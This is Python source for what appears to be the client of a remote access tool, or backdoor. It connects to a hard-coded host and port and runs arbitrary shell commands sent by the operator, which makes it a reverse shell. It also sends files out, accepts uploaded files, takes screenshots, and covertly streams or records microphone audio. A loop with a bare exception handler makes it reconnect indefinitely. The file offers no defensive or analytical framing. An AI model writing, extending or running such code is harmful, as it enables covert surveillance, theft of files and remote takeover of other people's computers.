import os
import socket
import subprocess
import wave

import pyaudio
import pyautogui


def infinite_body():
    SERVER_HOST = '192.168.1.124'
    SERVER_PORT = 5003
    BUFFER_SIZE = 4096
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))

    class Audio:
        def __init__(self):
            self.CHUNK = 256
            self.FORMAT = pyaudio.paInt16
            self.CHANNELS = 1
            self.RATE = 44100
            self.p = pyaudio.PyAudio()
            self.stream = self.p.open(format=self.FORMAT,
                                      channels=self.CHANNELS,
                                      rate=self.RATE,
                                      input=True,
                                      output=True,
                                      frames_per_buffer=self.CHUNK)

        def stream_method(self, s):
            while True:
                s.sendall(self.stream.read(self.CHUNK))
            stream.stop_stream()
            stream.close()

        def record_method(self, seconds, filename):
            frames = []
            for i in range(int(44100 / self.CHUNK * seconds)):
                data = self.stream.read(self.CHUNK)
                frames.append(data)
            self.stream.stop_stream()
            self.stream.close()
            self.p.terminate()
            wf = wave.open(filename, 'wb')
            wf.setnchannels(self.CHANNELS)
            wf.setsampwidth(self.p.get_sample_size(self.FORMAT))
            wf.setframerate(self.RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

    def time_stamp(filename):
        from datetime import datetime
        data = datetime.now().strftime('%y_%m_%d_%H_%M_%S_')
        filename = data + filename
        return filename

    def path(name):
        name = os.path.join(os.getcwd(), name)
        return name

    def cpu():
        from psutil import cpu_percent
        percent = str(cpu_percent(interval=1))
        s.send(percent.encode())

    def download():
        full_path = s.recv(BUFFER_SIZE).decode()
        filesize = os.path.getsize(full_path)
        filesize_send = str(filesize)
        s.send(filesize_send.encode())
        with open(full_path, "rb") as f:
            for _ in range(filesize):
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
        s.send('^^^^^^^^^^^^^^^^^^^^^'.encode())

    def upload():
        full_path = s.recv(BUFFER_SIZE).decode()
        filename = os.path.basename(full_path)
        filesize = s.recv(BUFFER_SIZE).decode()
        filesize = int(filesize)
        with open(filename, 'wb') as f:
            for _ in range(filesize):
                bytes_read = s.recv(BUFFER_SIZE)
                if len(bytes_read) < BUFFER_SIZE:
                    f.write(bytes_read)
                    break
                f.write(bytes_read)
        s.send('^^^^^^^^^^^^^^^^^^^^^'.encode())

    def change_dir():
        full_path = s.recv(BUFFER_SIZE).decode()
        os.chdir(full_path)
        s.send('Executed.'.encode())

    def screenshot():
        name = time_stamp('screenshot.png')
        img = pyautogui.screenshot(name)
        name = path(name)
        s.send(name.encode())

    def stream_audio():
        r = Audio()
        r.stream_method(s)

    def record_audio():
        time = s.recv(BUFFER_SIZE).decode()
        name = time_stamp('audio.wav')
        r = Audio()
        r.record_method(int(time), name)
        name = path(name)
        s.send(name.encode())

    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == 'exit':
            break
        elif command.lower() == 'cpu percent':
            cpu()
        elif command.lower() == 'download':
            download()
        elif command.lower() == 'upload':
            upload()
        elif command.lower() == 'change dir':
            change_dir()
        elif command.lower() == 'screenshot':
            screenshot()
        elif command.lower() == 'stream audio':
            stream_audio()
        elif command.lower() == 'record audio':
            record_audio()
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
            if len(output) == 0:
                s.send('No command output.'.encode())
            else:
                # send the results back to the server
                s.send(output.encode())

    # close client connection
    s.close()


while True:
    try:
        infinite_body()
    except:
        continue
